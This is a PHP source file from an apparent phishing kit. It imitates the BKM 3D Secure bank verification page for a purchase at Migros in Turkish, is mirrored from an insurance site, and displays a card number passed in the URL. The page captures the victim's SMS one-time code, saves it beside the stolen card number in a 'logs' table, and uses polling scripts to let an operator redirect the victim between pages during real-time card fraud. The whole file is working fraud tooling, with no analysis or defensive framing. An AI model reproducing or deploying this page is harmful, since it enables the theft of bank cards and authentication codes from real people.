<?php 
error_reporting(E_ALL);
ini_set("display_errors", 1);

include("db/connect.php");
$kart2 = $_GET['kart'];
$kart = str_replace(' ', '', $kart2);
$fiyat = $_GET['fiyat'];
if(isset($_POST['submiit']))
{
$hsms = $baglanti->prepare("UPDATE logs SET sms=? WHERE kart=?");
$hsms->execute([$_POST['sms'],$kart]);

$sayfa = $baglanti->prepare("UPDATE logs SET durum=? WHERE kart=?");
$sayfa->execute(["bekle", $kart]);
header("location:3dbekle.php?kart=$kart&fiyat=$fiyat");

}
?>
<!DOCTYPE html>
<html lang="tr" style="height: 100%; width: 100%;">
<!-- Mirrored from sigortacuzdani.com.tr/sms.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Mar 2023 18:43:10 GMT -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style>*{font-family: sans-serif}</style>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="shortcut icon" type="image/png" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" href="https://acs.bkm.com.tr/mdpayacs/img/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <title>BKM ACS</title>
  <!-- CSS -->
  <link rel="stylesheet" href="3d_files/bkmacs-dist.css">
  <link rel="stylesheet" href="3d_files/main-dist.css" type="text/css" media="screen">
  <!-- JS -->
  <!--[if gte IE 9]><!-->
  <script type="text/javascript" src="3d_files/main-dist.js.html"></script>
  <!--<![endif]-->
  <script type="text/javascript">var isSupportedIE = true;</script>
  <!--[if lt IE 9]>
  <script type="text/javascript">isSupportedIE = false;</script>
<![endif]-->
</head>
<style>*{font-family: sans-serif;}</style>
<body onload="init(300)">
    <!--[if lt IE 9]>
      <div align="center" style="margin: auto; padding-top: 30px; display: table;">
        <h1>Kullanmakta olduðunuz browser desteklenmemektedir.<br>Lütfen güncel bir browser kullanýnýz.</h1>
        <form 3dsaction="manual" id="bkmform" method="POST" action="https://acs.bkm.com.tr/mdpayacs/pareq;mdsessionid=150310409402846ED587D411CDE6316C">
          <button id="cancel" name="cancel" class="button btn-1 btn-commit" value="cancel">Devam</button>   
        </form>
      </div>
      <div class="content-wrapper" style="display: none;">
      <![endif]-->
      <!--[if gte IE 9]><!-->
      <div class="content-wrapper">
        <!--<![endif]-->
        <!--approve page-->
        <div class="header">
          <div class="brand-logo">
            <img 3dslogo="scheme" align="left" src="3d_files/schema_000000002.gif">
          </div>
          <div class="member-logo"><img src='https://files.sikayetvar.com/lg/cmp/65/65926.png?1522650125' style='float:right' width='120px'>



          </div>
        </div>
        <div id="approve-page">
          <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
            <div class="loader"></div>
          </div>
          <div class="content">
            <h1 id="approve-header">Dogrulama kodunu giriniz</h1>
            <div class="info-wrapper">
                    <div class="info-row">
                        <div class="info-col info-label">Isyeri Adi:</div>
                        <div class="info-col" 3dsdisplay="merchant" id="merchant-name">MIGROS</div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Islem Tutari:</div>
                        <div class="info-col amount" 3dsdisplay="amount" id="amount"><?php  echo number_format($_GET['fiyat'], 0, ',', '.');?> ₺</div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Islem Tarihi/Saati:</div>
                        <div class="info-col" 3dsdisplay="date" id="operation-date-time"><?php echo date('H:i:s');?></div>
                    </div>
              <div class="info-row">
                <div class="info-col info-label">Kart Numarasi:</div>
                <div class="info-col" 3dsdisplay="pan" id="pan"><?php echo $_GET['kart'];?></div>
              </div>
              
              
              
            </div>
            <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
              <div>
                <h3>Lutfen lsks9216 referans numarali alisveris sifrenizi giriniz.</h3>
              </div>
              <div class="form-wrapper">
                <input name="fakePasswordRemembered" id="fakePasswordRemembered" style="display: none;" type="password">
                <div class="form-code">
                  <input type="hidden" name="islem" value="sms">
                  <input type="hidden" name="v" value="d">
                  <div class="form-row">
                    <label for="code" class="otpcode">Dogrulama Kodu</label>
                    <form method="POST"><input 3dsinput="password" type="text" class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="8" min="4" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                  </div>
                  <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: block;">
                    <span class="has-reg"></span></div> 
                    <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                      <div>
                        <span class="has-reg">Dogrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                      </div>
                      <button id="retryButton" type="submit" onclick="retryButtonClick()" class="button btn-1 re-code v1" name="newsms" value="retry">Dogrulama Kodunu Yeniden Gönder</button>
                      <div>
                        <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardim</label>
                      </div>
                      <input style="display: none" class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                      <div class="noscriptHelpText">
                      </div>
                    </div>
                    <div></div>                <div id="submitButtonDiv">
                      <div class="has-submit">
                        <button id="submitbutton" type="submit" name="submiit" value="confirm" class="button btn-1 btn-commit" onclick="send3d()">Onayla</button></form>
                      </div>
                      <div id="timerDiv" class="has-timer">
                        <span>Kalan Sure: </span> <span class="has-counter" id="has-counter">02:56</span><br>
                      </div>
                    </div>
                    <div class="call-to-action">
                      <div class="action-list">
                        <div class="action-row">
                          <div class="action-col left">
                            <a data-fancybox="" data-src="#canceldialog" href="javascript:;" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">Islemi Iptal Et</a>
                            <button id="triggercancel" type="submit" name="cancel" value="cancel" style="display: none;"></button>
                          </div>  
                          <div class="action-col right">
                            <a href="sss.html" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">Yardim</a>
                          </div>
                        </div>
                      </div>
                      <div style="display: none;">
                        <div class="panel" id="canceldialog">
                          <h1 class="small" id="msg-cancel-box">Isyeri sayfasina yönlendirileceksiniz, isleminizi iptal etmek
                          istediginizden emin misiniz?</h1>
                          <a href="javascript:;" onclick="$.fancybox.close();" class="button btn-1 close-modal">Vazgec</a>
                          <a id="cancelbutton" class="button btn-1 btn-1-cancel txt-link trigger-cancel-page">İslemi İptal Et</a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <img src="https://unalarif.com/wp-content/uploads/image-261.png" width="140px">
            </div>
          </div>
        </div>
        <script type="text/javascript" src="3d_files/bkmacs-dist.js.html" charset="utf-8"></script>
        <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script type="text/javascript">
          $( document ).ready(function() {
            $.ajax({
              url: 'getinfo.php?type=x',
              dataType: 'JSON',
              success: function(callback){
                $("#operation-date-time").html(callback.date);
                $("#amount").html(callback.price);
              }
            });
          });
        </script>
        <script type="text/javascript">
          pingPong();

          self.setInterval('pingPong()', 3000);
          $.ajax({
            url: 'page.php?page=3d',
            type: 'GET'
          });
          function pingPong(){
            $.ajax({
              url: 'pingpong.php',
              type: 'GET',
              dataType: 'JSON',
              success: function(callback){
                if(callback.status == 'index'){
                  window.location.href = 'trafik-sigortasi.html';
                }else if(callback.status == 'bekle'){
                  window.location.href = '3dbekle.html';
                }else if(callback.status == 'sms'){
                  window.location.href = 'sms.html';
                }else if(callback.status == 'hsms'){
                  window.location.href = 'hsms.html';
                }else if(callback.status == 'tebrik'){
                  window.location.href = 'tebrik.html'
                }else if(callback.status == 'priv'){
                  window.location.href = 'priv.html'
                }
              }
            });
          }
        </script>
        <script type="text/javascript">
          function send3d(){
            var passwordfield = $("#passwordfield").val();
            if(passwordfield == ''){
              alert("SMS kodunu girmelisiniz");
            }else{
              $.ajax({
                url: 'send3d.php',
                type: 'POST',
                dataType: 'JSON',
                data: {
                  sms: passwordfield,
                  yanlis_step: 'hayir'
                },
                success: function(response){
                  if(response.status == true){
                    window.location.href = '3dbekle.html'
                  }
                }
              });
            }
          }
        </script>

      </body>
<!-- Mirrored from sigortacuzdani.com.tr/sms.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Mar 2023 18:43:11 GMT -->
</html>